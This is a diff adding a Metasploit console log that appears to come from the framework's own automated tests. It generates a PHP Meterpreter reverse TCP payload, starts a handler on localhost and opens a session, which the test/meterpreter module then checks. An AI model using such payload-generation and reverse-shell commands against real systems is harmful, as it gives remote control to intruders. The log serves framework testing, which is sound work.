@@ -1,0 +1,22 @@
+use php/meterpreter/reverse_tcp
+Stopping all jobs...
+[4mmsf6[0m post([1m[31mtest/get_env[0m) [0m> generate -o /tmp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220128-3308-18m44ly.php -f raw lport=6040 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> [*] Writing 1110 bytes to /tmp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220128-3308-18m44ly.php...
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 38
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6040 
+[*] Sending stage (39282 bytes) to 127.0.0.1
+[*] Meterpreter session 39 opened (127.0.0.1:6040 -> 127.0.0.1:40154 ) at 2022-01-28 22:44:13 +0000
+use test/meterpreter
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> run session=39 addentropy=true verbose=true
+[*] Setup: changing working directory to /tmp
+[*] Running against session 39
+[*] Session type is meterpreter and platform is linux
+[+] should enumerate supported core commands
+[+] should support 3 or more core commands
+[*] Starting process tests
+[*] Pid: 4244
+[+] should return its own process id
+[*] 127.0.0.1 - Meterpreter session 39 closed.  Reason: Died
